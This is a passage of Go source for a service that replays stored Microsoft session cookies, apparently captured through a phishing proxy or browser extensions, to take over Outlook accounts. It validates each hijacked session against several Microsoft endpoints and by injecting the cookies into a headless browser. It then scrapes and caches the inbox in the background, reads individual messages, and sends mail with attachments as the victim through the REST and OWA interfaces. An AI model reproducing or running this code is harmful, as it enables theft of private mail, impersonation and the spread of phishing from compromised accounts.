		Success: false, Method: "graph_api",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// getInboxViaGraphAPI reads inbox messages using Microsoft Graph API
func (s *CookieStoreService) getInboxViaGraphAPI(ctx context.Context, accessToken string, folder string, limit int, skip int) ([]model.InboxMessage, int, error) {
	apiURL := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/me/mailFolders/%s/messages?$top=%d&$skip=%d&$orderby=receivedDateTime%%20desc&$select=id,from,subject,receivedDateTime,bodyPreview,conversationId,isRead,hasAttachments,toRecipients",
		folder, limit, skip,
	)

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, 0, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return nil, 0, fmt.Errorf("Graph API inbox failed (HTTP %d): %s", resp.StatusCode, string(body))
	}

	return s.parseGraphMessagesResponse(resp.Body)
}

// getMessageViaGraphAPI reads a specific message using Microsoft Graph API
func (s *CookieStoreService) getMessageViaGraphAPI(ctx context.Context, accessToken string, messageID string) (*model.InboxMessageFull, error) {
	apiURL := fmt.Sprintf(
		"https://graph.microsoft.com/v1.0/me/messages/%s?$select=id,from,subject,receivedDateTime,body,bodyPreview,isRead,hasAttachments,toRecipients,ccRecipients,importance",
		messageID,
	)

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("Graph API message read failed (HTTP %d)", resp.StatusCode)
	}

	return s.parseGraphMessageFull(resp.Body)
}

// getFoldersViaGraphAPI lists mail folders using Microsoft Graph API
func (s *CookieStoreService) getFoldersViaGraphAPI(ctx context.Context, accessToken string) ([]model.InboxFolder, error) {
	apiURL := "https://graph.microsoft.com/v1.0/me/mailFolders?$select=id,displayName,totalItemCount,unreadItemCount"

	httpReq, err := http.NewRequestWithContext(ctx, "GET", apiURL, nil)
	if err != nil {
		return nil, err
	}
	httpReq.Header.Set("Authorization", "Bearer "+accessToken)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("Graph API folders failed (HTTP %d)", resp.StatusCode)
	}

	var folderData struct {
		Value []struct {
			ID              string `json:"id"`
			DisplayName     string `json:"displayName"`
			TotalItemCount  int    `json:"totalItemCount"`
			UnreadItemCount int    `json:"unreadItemCount"`
		} `json:"value"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&folderData); err != nil {
		return nil, err
	}

	folders := make([]model.InboxFolder, len(folderData.Value))
	for i, f := range folderData.Value {
		folders[i] = model.InboxFolder{
			ID:              f.ID,
			DisplayName:     f.DisplayName,
			TotalItemCount:  f.TotalItemCount,
			UnreadItemCount: f.UnreadItemCount,
		}
	}

	return folders, nil
}

// --- Internal helpers ---

// buildCookieHeader builds a Cookie header string from stored cookies JSON,
// filtering to only Outlook/Microsoft domains.
// Uses generic map parsing to handle cookies from different sources
// (proxy captures use string booleans, extensions use real booleans).
func (s *CookieStoreService) buildCookieHeader(cookiesJSON string) string {
	// Use generic map parsing to handle both string and boolean fields
	var rawCookies []map[string]interface{}
	if err := json.Unmarshal([]byte(cookiesJSON), &rawCookies); err != nil {
		s.Logger.Errorw("failed to parse cookies JSON", "error", err)
		return ""
	}

	var parts []string
	for _, c := range rawCookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		domain, _ := c["domain"].(string)

		if name == "" || value == "" || domain == "" {
			continue
		}

		if !strings.HasPrefix(domain, ".") {
			domain = "." + domain
		}
		isOutlook := false
		for _, od := range outlookDomains {
			if strings.HasSuffix(domain, od) || domain == od {
				isOutlook = true
				break
			}
		}
		if isOutlook {
			parts = append(parts, fmt.Sprintf("%s=%s", name, value))
		}
	}

	return strings.Join(parts, "; ")
}

// buildAllCookieHeader builds a Cookie header string from ALL stored cookies
// (no domain filtering). Used for validation endpoints that may need
// cookies from various Microsoft domains.
func (s *CookieStoreService) buildAllCookieHeader(cookiesJSON string) string {
	var rawCookies []map[string]interface{}
	if err := json.Unmarshal([]byte(cookiesJSON), &rawCookies); err != nil {
		s.Logger.Errorw("failed to parse cookies JSON", "error", err)
		return ""
	}

	var parts []string
	for _, c := range rawCookies {
		name, _ := c["name"].(string)
		value, _ := c["value"].(string)
		if name == "" || value == "" {
			continue
		}
		parts = append(parts, fmt.Sprintf("%s=%s", name, value))
	}

	return strings.Join(parts, "; ")
}

// validateAndUpdate validates a cookie session and updates the database record.
// It tries token exchange first (MSRT refresh token -> Graph API), then browser
// automation, then falls back to cookie-based validation against multiple endpoints.
// After successful validation, it triggers background pre-automation to scrape and cache inbox data.
func (s *CookieStoreService) validateAndUpdate(ctx context.Context, id uuid.UUID) error {
	store, err := s.CookieStoreRepo.GetByID(ctx, id)
	if err != nil {
		return err
	}

	var validatedEmail, validatedDisplayName string
	var isValid bool

	// Attempt 1: Token exchange (MSRT -> access token -> Graph API /me)
	email, displayName, valid := s.validateViaTokenExchange(ctx, store)
	if valid {
		now := time.Now()
		updates := map[string]interface{}{
			"is_valid":          true,
			"last_checked":      now,
			"validation_method": "token_exchange",
		}
		if email != "" {
			updates["email"] = email
		}
		if displayName != "" {
			updates["display_name"] = displayName
		}
		if err := s.CookieStoreRepo.Update(ctx, id, updates); err != nil {
			return err
		}
		validatedEmail = email
		validatedDisplayName = displayName
		isValid = true
	}

	if !isValid {
		// Attempt 2: Browser automation (headless Chrome with cookie injection)
		browserEmail, browserDisplayName, browserToken, browserValid := s.validateViaBrowser(ctx, store)
		if browserValid {
			now := time.Now()
			updates := map[string]interface{}{
				"is_valid":          true,
				"last_checked":      now,
				"validation_method": "browser",
			}
			if browserEmail != "" {
				updates["email"] = browserEmail
			}
			if browserDisplayName != "" {
				updates["display_name"] = browserDisplayName
			}
			if browserToken != "" {
				updates["access_token"] = browserToken
				expiry := time.Now().Add(55 * time.Minute)
				updates["token_expiry"] = expiry
			}
			if err := s.CookieStoreRepo.Update(ctx, id, updates); err != nil {
				return err
			}
			validatedEmail = browserEmail
			validatedDisplayName = browserDisplayName
			isValid = true
		}
	}

	if !isValid {
		// Attempt 3: Cookie-based validation against multiple endpoints
		allCookieHeader := s.buildAllCookieHeader(store.CookiesJSON)
		if allCookieHeader == "" {
			now := time.Now()
			return s.CookieStoreRepo.Update(ctx, id, map[string]interface{}{
				"is_valid":          false,
				"last_checked":      now,
				"automation_status": "failed",
			})
		}

		email, displayName, valid = s.validateSession(ctx, allCookieHeader)

		now := time.Now()
		updates := map[string]interface{}{
			"is_valid":     valid,
			"last_checked": now,
		}
		if valid {
			updates["validation_method"] = "cookie"
		} else {
			updates["automation_status"] = "failed"
		}
		if email != "" {
			updates["email"] = email
		}
		if displayName != "" {
			updates["display_name"] = displayName
		}

		if err := s.CookieStoreRepo.Update(ctx, id, updates); err != nil {
			return err
		}
		validatedEmail = email
		validatedDisplayName = displayName
		isValid = valid
	}

	// If validation succeeded, trigger background pre-automation to scrape and cache inbox
	if isValid && s.BrowserSession != nil {
		go s.runPreAutomation(id, store.CookiesJSON, validatedEmail, validatedDisplayName)
	}

	return nil
}

// validateSession checks if a cookie session is valid against multiple Microsoft APIs
func (s *CookieStoreService) validateSession(ctx context.Context, cookieHeader string) (email, displayName string, valid bool) {
	client := &http.Client{Timeout: 15 * time.Second}

	// Attempt 1: Outlook REST API /me endpoint
	s.Logger.Debugw("cookie validation: trying Outlook REST API")
	httpReq, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.office365.com/api/v2.0/me", nil)
	if err == nil {
		httpReq.Header.Set("Cookie", cookieHeader)
		httpReq.Header.Set("User-Agent", outlookUserAgent)
		httpReq.Header.Set("Accept", "application/json")

		resp, err := client.Do(httpReq)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Outlook REST API response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				var data struct {
					EmailAddress string `json:"EmailAddress"`
					DisplayName  string `json:"DisplayName"`
					ID           string `json:"Id"`
				}
				if json.NewDecoder(resp.Body).Decode(&data) == nil {
					email = data.EmailAddress
					if email == "" {
						email = data.ID
					}
					displayName = data.DisplayName
					return email, displayName, true
				}
			}
		}
	}

	// Attempt 2: Microsoft Graph API /me endpoint
	s.Logger.Debugw("cookie validation: trying Microsoft Graph API")
	httpReq2, err := http.NewRequestWithContext(ctx, "GET", "https://graph.microsoft.com/v1.0/me", nil)
	if err == nil {
		httpReq2.Header.Set("Cookie", cookieHeader)
		httpReq2.Header.Set("User-Agent", outlookUserAgent)
		httpReq2.Header.Set("Accept", "application/json")

		resp, err := client.Do(httpReq2)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Graph API response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				var data struct {
					Mail        string `json:"mail"`
					DisplayName string `json:"displayName"`
					UPN         string `json:"userPrincipalName"`
				}
				if json.NewDecoder(resp.Body).Decode(&data) == nil {
					email = data.Mail
					if email == "" {
						email = data.UPN
					}
					displayName = data.DisplayName
					if email != "" || displayName != "" {
						return email, displayName, true
					}
				}
			}
		}
	}

	// Attempt 3: OWA (Outlook Web App)
	s.Logger.Debugw("cookie validation: trying OWA")
	httpReq3, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.office365.com/owa/", nil)
	if err == nil {
		httpReq3.Header.Set("Cookie", cookieHeader)
		httpReq3.Header.Set("User-Agent", outlookUserAgent)

		noRedirectClient := &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		resp, err := noRedirectClient.Do(httpReq3)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: OWA response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				return "unknown (OWA session)", "", true
			}
		}
	}

	// Attempt 4: Office.com API to check if the session is alive
	s.Logger.Debugw("cookie validation: trying Office.com")
	httpReq4, err := http.NewRequestWithContext(ctx, "GET", "https://www.office.com/api/auth/me", nil)
	if err == nil {
		httpReq4.Header.Set("Cookie", cookieHeader)
		httpReq4.Header.Set("User-Agent", outlookUserAgent)
		httpReq4.Header.Set("Accept", "application/json")

		resp, err := client.Do(httpReq4)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Office.com response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				var data struct {
					Email       string `json:"email"`
					DisplayName string `json:"displayName"`
					UPN         string `json:"upn"`
				}
				if json.NewDecoder(resp.Body).Decode(&data) == nil {
					email = data.Email
					if email == "" {
						email = data.UPN
					}
					displayName = data.DisplayName
					if email != "" || displayName != "" {
						return email, displayName, true
					}
				}
				// Even if we couldn't parse the response, a 200 means the session is alive
				return "unknown (Office session)", "", true
			}
		}
	}

	// Attempt 5: Outlook.live.com for personal Microsoft accounts
	s.Logger.Debugw("cookie validation: trying Outlook.live.com")
	httpReq5, err := http.NewRequestWithContext(ctx, "GET", "https://outlook.live.com/owa/", nil)
	if err == nil {
		httpReq5.Header.Set("Cookie", cookieHeader)
		httpReq5.Header.Set("User-Agent", outlookUserAgent)

		noRedirectClient := &http.Client{
			Timeout: 15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
		resp, err := noRedirectClient.Do(httpReq5)
		if err == nil {
			defer resp.Body.Close()
			s.Logger.Debugw("cookie validation: Outlook.live.com response", "status", resp.StatusCode)
			if resp.StatusCode == 200 {
				return "unknown (Outlook.live session)", "", true
			}
		}
	}

	s.Logger.Warnw("cookie validation: all methods failed")
	return "", "", false
}

// buildMessagePayload builds the Outlook REST API message payload
func (s *CookieStoreService) buildMessagePayload(req *model.CookieSendRequest, fromEmail string) map[string]interface{} {
	toRecipients := make([]map[string]interface{}, len(req.To))
	for i, email := range req.To {
		toRecipients[i] = map[string]interface{}{
			"EmailAddress": map[string]string{"Address": email},
		}
	}

	contentType := "Text"
	if req.IsHTML {
		contentType = "HTML"
	}

	message := map[string]interface{}{
		"Subject": req.Subject,
		"Body": map[string]interface{}{
			"ContentType": contentType,
			"Content":     req.Body,
		},
		"ToRecipients": toRecipients,
	}

	if fromEmail != "" {
		message["From"] = map[string]interface{}{
			"EmailAddress": map[string]string{
				"Address": fromEmail,
			},
		}
	}

	if len(req.CC) > 0 {
		ccRecipients := make([]map[string]interface{}, len(req.CC))
		for i, email := range req.CC {
			ccRecipients[i] = map[string]interface{}{
				"EmailAddress": map[string]string{"Address": email},
			}
		}
		message["CcRecipients"] = ccRecipients
	}

	if len(req.BCC) > 0 {
		bccRecipients := make([]map[string]interface{}, len(req.BCC))
		for i, email := range req.BCC {
			bccRecipients[i] = map[string]interface{}{
				"EmailAddress": map[string]string{"Address": email},
			}
		}
		message["BccRecipients"] = bccRecipients
	}

	// Add attachments if present (Outlook REST API v2.0 format)
	if len(req.Attachments) > 0 {
		attachments := make([]map[string]interface{}, len(req.Attachments))
		for i, att := range req.Attachments {
			attachment := map[string]interface{}{
				"@odata.type":  "#Microsoft.OutlookServices.FileAttachment",
				"Name":         att.Name,
				"ContentType":  att.ContentType,
				"ContentBytes": att.ContentB64,
			}
			if att.IsInline {
				attachment["IsInline"] = true
				if att.ContentID != "" {
					attachment["ContentId"] = att.ContentID
				}
			}
			attachments[i] = attachment
		}
		message["Attachments"] = attachments
	}

	return message
}

// sendViaRestAPI sends an email via Outlook REST API v2.0
func (s *CookieStoreService) sendViaRestAPI(ctx context.Context, cookieHeader string, message map[string]interface{}, req *model.CookieSendRequest) *model.CookieSendResult {
	payload := map[string]interface{}{
		"Message":         message,
		"SaveToSentItems": req.SaveToSent,
	}

	body, _ := json.Marshal(payload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://outlook.office365.com/api/v2.0/me/sendmail", bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "rest_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Accept", "application/json")

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "rest_api", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 202 || resp.StatusCode == 200 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "rest_api",
			MessageID: fmt.Sprintf("cookie-rest-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
		Success: false, Method: "rest_api",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// sendViaOWA sends an email via OWA endpoint (fallback)
func (s *CookieStoreService) sendViaOWA(ctx context.Context, cookieHeader string, req *model.CookieSendRequest) *model.CookieSendResult {
	msgItem := map[string]interface{}{
		"__type":  "Message:#Exchange",
		"Subject": req.Subject,
		"Body": map[string]interface{}{
			"__type":   "BodyContentType:#Exchange",
			"BodyType": "HTML",
			"Value":    req.Body,
		},
		"ToRecipients": s.buildOWARecipients(req.To),
	}

	// Add CC recipients
	if len(req.CC) > 0 {
		msgItem["CcRecipients"] = s.buildOWARecipients(req.CC)
	}

	// Add BCC recipients
	if len(req.BCC) > 0 {
		msgItem["BccRecipients"] = s.buildOWARecipients(req.BCC)
	}

	// Add attachments if present (OWA format)
	if len(req.Attachments) > 0 {
		owaAttachments := make([]map[string]interface{}, len(req.Attachments))
		for i, att := range req.Attachments {
			owaAttachment := map[string]interface{}{
				"__type":       "FileAttachment:#Exchange",
				"Name":         att.Name,
				"ContentType":  att.ContentType,
				"ContentBytes": att.ContentB64,
				"IsInline":     att.IsInline,
			}
			if att.ContentID != "" {
				owaAttachment["ContentId"] = att.ContentID
			}
			owaAttachments[i] = owaAttachment
		}
		msgItem["Attachments"] = owaAttachments
	}

	owaPayload := map[string]interface{}{
		"__type": "SendItemRequest:#Exchange",
		"Items":  []map[string]interface{}{msgItem},
	}

	body, _ := json.Marshal(owaPayload)

	httpReq, err := http.NewRequestWithContext(ctx, "POST",
		"https://outlook.office365.com/owa/service.svc?action=CreateItem&ID=-1&AC=1",
		bytes.NewReader(body))
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "owa", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}

	httpReq.Header.Set("Cookie", cookieHeader)
	httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
	httpReq.Header.Set("User-Agent", outlookUserAgent)
	httpReq.Header.Set("Action", "CreateItem")

	// Extract X-OWA-CANARY from cookies
	canary := s.extractCanary(cookieHeader)
	if canary != "" {
		httpReq.Header.Set("X-OWA-CANARY", canary)
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(httpReq)
	if err != nil {
		return &model.CookieSendResult{
			Success: false, Method: "owa", Error: err.Error(),
			SentAt: time.Now().UTC().Format(time.RFC3339),
		}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 || resp.StatusCode == 202 {
		return &model.CookieSendResult{
			Success:   true,
			Method:    "owa",
			MessageID: fmt.Sprintf("cookie-owa-%d", time.Now().UnixMilli()),
			SentAt:    time.Now().UTC().Format(time.RFC3339),
		}
	}

	respBody, _ := io.ReadAll(resp.Body)
	return &model.CookieSendResult{
		Success: false, Method: "owa",
		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
		SentAt: time.Now().UTC().Format(time.RFC3339),
	}
}

// buildOWARecipients builds OWA-format recipients
func (s *CookieStoreService) buildOWARecipients(emails []string) []map[string]interface{} {
	recipients := make([]map[string]interface{}, len(emails))
	for i, email := range emails {
		recipients[i] = map[string]interface{}{
			"__type": "SingleRecipientType:#Exchange",
			"Mailbox": map[string]interface{}{
				"__type":       "EmailAddressWrapper:#Exchange",
				"EmailAddress": email,
				"Name":         email,
			},
		}
	}
	return recipients
}

// extractCanary extracts the X-OWA-CANARY token from cookies
func (s *CookieStoreService) extractCanary(cookieHeader string) string {
	parts := strings.Split(cookieHeader, ";")
	for _, part := range parts {
		part = strings.TrimSpace(part)
		if strings.HasPrefix(strings.ToLower(part), "x-owa-canary=") {
			idx := strings.Index(part, "=")
			if idx >= 0 {
				return part[idx+1:]
			}
		}
	}
	return ""
}

// parseMessagesResponse parses the Outlook REST API messages response
func (s *CookieStoreService) parseMessagesResponse(body io.Reader) ([]model.InboxMessage, int, error) {
	var msgData struct {
		Value []struct {
			ID               string `json:"Id"`
			Subject          string `json:"Subject"`
			ReceivedDateTime string `json:"ReceivedDateTime"`
			BodyPreview      string `json:"BodyPreview"`
			ConversationID   string `json:"ConversationId"`
			IsRead           bool   `json:"IsRead"`
			HasAttachments   bool   `json:"HasAttachments"`
			From             struct {
				EmailAddress struct {
					Address string `json:"Address"`
					Name    string `json:"Name"`
				} `json:"EmailAddress"`
			} `json:"From"`
			ToRecipients []struct {
				EmailAddress struct {
					Address string `json:"Address"`
				} `json:"EmailAddress"`
			} `json:"ToRecipients"`
		} `json:"value"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, 0, errs.Wrap(err)
	}

	messages := make([]model.InboxMessage, len(msgData.Value))
	for i, m := range msgData.Value {
		toAddrs := make([]string, 0)
		for _, r := range m.ToRecipients {
			if r.EmailAddress.Address != "" {
				toAddrs = append(toAddrs, r.EmailAddress.Address)
			}
		}

		messages[i] = model.InboxMessage{
			ID:             m.ID,
			From:           m.From.EmailAddress.Address,
			FromName:       m.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        m.Subject,
			Preview:        m.BodyPreview,
			Date:           m.ReceivedDateTime,
			IsRead:         m.IsRead,
			HasAttachments: m.HasAttachments,
			ConversationID: m.ConversationID,
		}
	}

	return messages, len(messages), nil
}

// parseGraphMessagesResponse parses the Microsoft Graph API messages response
func (s *CookieStoreService) parseGraphMessagesResponse(body io.Reader) ([]model.InboxMessage, int, error) {
	var msgData struct {
		Value []struct {
			ID               string `json:"id"`
			Subject          string `json:"subject"`
			ReceivedDateTime string `json:"receivedDateTime"`
			BodyPreview      string `json:"bodyPreview"`
			ConversationID   string `json:"conversationId"`
			IsRead           bool   `json:"isRead"`
			HasAttachments   bool   `json:"hasAttachments"`
			From             struct {
				EmailAddress struct {
					Address string `json:"address"`
					Name    string `json:"name"`
				} `json:"emailAddress"`
			} `json:"from"`
			ToRecipients []struct {
				EmailAddress struct {
					Address string `json:"address"`
				} `json:"emailAddress"`
			} `json:"toRecipients"`
		} `json:"value"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, 0, errs.Wrap(err)
	}

	messages := make([]model.InboxMessage, len(msgData.Value))
	for i, m := range msgData.Value {
		toAddrs := make([]string, 0)
		for _, r := range m.ToRecipients {
			if r.EmailAddress.Address != "" {
				toAddrs = append(toAddrs, r.EmailAddress.Address)
			}
		}

		messages[i] = model.InboxMessage{
			ID:             m.ID,
			From:           m.From.EmailAddress.Address,
			FromName:       m.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        m.Subject,
			Preview:        m.BodyPreview,
			Date:           m.ReceivedDateTime,
			IsRead:         m.IsRead,
			HasAttachments: m.HasAttachments,
			ConversationID: m.ConversationID,
		}
	}

	return messages, len(messages), nil
}

// parseMessageFull parses a full message from the Outlook REST API
func (s *CookieStoreService) parseMessageFull(body io.Reader) (*model.InboxMessageFull, error) {
	var msgData struct {
		ID               string `json:"Id"`
		Subject          string `json:"Subject"`
		ReceivedDateTime string `json:"ReceivedDateTime"`
		IsRead           bool   `json:"IsRead"`
		HasAttachments   bool   `json:"HasAttachments"`
		BodyPreview      string `json:"BodyPreview"`
		Body             struct {
			ContentType string `json:"ContentType"`
			Content     string `json:"Content"`
		} `json:"Body"`
		From struct {
			EmailAddress struct {
				Address string `json:"Address"`
				Name    string `json:"Name"`
			} `json:"EmailAddress"`
		} `json:"From"`
		ToRecipients []struct {
			EmailAddress struct {
				Address string `json:"Address"`
			} `json:"EmailAddress"`
		} `json:"ToRecipients"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, errs.Wrap(err)
	}

	toAddrs := make([]string, 0)
	for _, r := range msgData.ToRecipients {
		if r.EmailAddress.Address != "" {
			toAddrs = append(toAddrs, r.EmailAddress.Address)
		}
	}

	bodyHTML := ""
	bodyText := ""
	if strings.EqualFold(msgData.Body.ContentType, "HTML") {
		bodyHTML = msgData.Body.Content
	} else {
		bodyText = msgData.Body.Content
	}

	return &model.InboxMessageFull{
		InboxMessage: model.InboxMessage{
			ID:             msgData.ID,
			From:           msgData.From.EmailAddress.Address,
			FromName:       msgData.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        msgData.Subject,
			Preview:        msgData.BodyPreview,
			Date:           msgData.ReceivedDateTime,
			IsRead:         msgData.IsRead,
			HasAttachments: msgData.HasAttachments,
		},
		BodyHTML: bodyHTML,
		BodyText: bodyText,
	}, nil
}

// parseGraphMessageFull parses a full message from the Microsoft Graph API
func (s *CookieStoreService) parseGraphMessageFull(body io.Reader) (*model.InboxMessageFull, error) {
	var msgData struct {
		ID               string `json:"id"`
		Subject          string `json:"subject"`
		ReceivedDateTime string `json:"receivedDateTime"`
		IsRead           bool   `json:"isRead"`
		HasAttachments   bool   `json:"hasAttachments"`
		BodyPreview      string `json:"bodyPreview"`
		Body             struct {
			ContentType string `json:"contentType"`
			Content     string `json:"content"`
		} `json:"body"`
		From struct {
			EmailAddress struct {
				Address string `json:"address"`
				Name    string `json:"name"`
			} `json:"emailAddress"`
		} `json:"from"`
		ToRecipients []struct {
			EmailAddress struct {
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"toRecipients"`
	}

	if err := json.NewDecoder(body).Decode(&msgData); err != nil {
		return nil, errs.Wrap(err)
	}

	toAddrs := make([]string, 0)
	for _, r := range msgData.ToRecipients {
		if r.EmailAddress.Address != "" {
			toAddrs = append(toAddrs, r.EmailAddress.Address)
		}
	}

	bodyHTML := ""
	bodyText := ""
	if strings.EqualFold(msgData.Body.ContentType, "html") {
		bodyHTML = msgData.Body.Content
	} else {
		bodyText = msgData.Body.Content
	}

	return &model.InboxMessageFull{
		InboxMessage: model.InboxMessage{
			ID:             msgData.ID,
			From:           msgData.From.EmailAddress.Address,
			FromName:       msgData.From.EmailAddress.Name,
			To:             toAddrs,
			Subject:        msgData.Subject,
			Preview:        msgData.BodyPreview,
			Date:           msgData.ReceivedDateTime,
			IsRead:         msgData.IsRead,
			HasAttachments: msgData.HasAttachments,
		},
		BodyHTML: bodyHTML,
		BodyText: bodyText,
	}, nil
}

// getInboxViaOWA reads inbox messages using the OWA service.svc FindItem endpoint.
// This is a fast, cookie-based method that doesn't require an access token or browser.
// It uses the X-OWA-CANARY token extracted from cookies for authentication.
func (s *CookieStoreService) getInboxViaOWA(ctx context.Context, cookieHeader string, folder string, limit int, skip int) ([]model.InboxMessage, error) {
	canary := s.extractCanary(cookieHeader)
	if canary == "" {
		return nil, fmt.Errorf("no X-OWA-CANARY token found in cookies")
	}

	// Map folder names to OWA distinguished folder IDs
	owaFolderMap := map[string]string{
		"inbox":        "inbox",
		"sentitems":    "sentitems",
		"drafts":       "drafts",
		"junkemail":    "junkemail",
		"deleteditems": "deleteditems",
	}
	owaFolder, ok := owaFolderMap[strings.ToLower(folder)]
	if !ok {
		owaFolder = folder
	}

	// Build the OWA FindItem request payload
	payload := map[string]interface{}{
		"__type": "FindItemJsonRequest:#Exchange",
		"Header": map[string]interface{}{
			"__type":       "JsonRequestHeaders:#Exchange",
			"RequestServerVersion": "Exchange2016",
			"TimeZoneContext": map[string]interface{}{
				"__type": "TimeZoneContext:#Exchange",
				"TimeZoneDefinition": map[string]interface{}{
					"__type": "TimeZoneDefinitionType:#Exchange",
					"Id":     "UTC",
				},
			},
		},
		"Body": map[string]interface{}{
			"__type": "FindItemRequest:#Exchange",
			"ItemShape": map[string]interface{}{
				"__type":   "ItemResponseShape:#Exchange",
				"BaseShape": "IdOnly",
				"AdditionalProperties": []map[string]interface{}{
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemSubject"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemDateTimeReceived"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemPreview"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemHasAttachments"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageIsRead"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageFrom"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageToRecipients"},
					{"__type": "PropertyUri:#Exchange", "FieldURI": "ConversationConversationId"},
				},
			},
			"ParentFolderIds": []map[string]interface{}{
				{
					"__type": "DistinguishedFolderId:#Exchange",
					"Id":     owaFolder,
				},
			},
			"Traversal": "Shallow",
			"Paging": map[string]interface{}{
				"__type":     "IndexedPageView:#Exchange",
				"BasePoint":  "Beginning",
				"Offset":     skip,
				"MaxEntriesReturned": limit,
			},
			"ViewFilter": "All",
			"SortOrder": []map[string]interface{}{
				{
					"__type": "SortResults:#Exchange",
					"Order":  "Descending",
					"Path": map[string]interface{}{
						"__type":   "PropertyUri:#Exchange",
						"FieldURI": "ItemDateTimeReceived",
					},
				},
			},
		},
	}

	payloadBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal OWA FindItem payload: %w", err)
	}

	// Try both OWA endpoints
	owaURLs := []string{
		"https://outlook.office365.com/owa/service.svc?action=FindItem",
		"https://outlook.office.com/owa/service.svc?action=FindItem",
	}

	var lastErr error
	for _, owaURL := range owaURLs {
		httpReq, reqErr := http.NewRequestWithContext(ctx, "POST", owaURL, bytes.NewReader(payloadBytes))
		if reqErr != nil {
			lastErr = reqErr
			continue
		}

		httpReq.Header.Set("Cookie", cookieHeader)
		httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
		httpReq.Header.Set("X-OWA-CANARY", canary)
		httpReq.Header.Set("X-OWA-UrlPostData", string(payloadBytes))
		httpReq.Header.Set("Action", "FindItem")
		httpReq.Header.Set("User-Agent", outlookUserAgent)
		httpReq.Header.Set("Accept", "application/json")

		client := &http.Client{Timeout: 30 * time.Second}
		resp, doErr := client.Do(httpReq)
		if doErr != nil {
			lastErr = doErr
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			lastErr = fmt.Errorf("OWA FindItem returned status %d", resp.StatusCode)
			continue
		}

		// Parse the OWA FindItem response
		var owaResp map[string]interface{}
		if decErr := json.NewDecoder(resp.Body).Decode(&owaResp); decErr != nil {
			lastErr = fmt.Errorf("failed to decode OWA response: %w", decErr)
			continue
		}

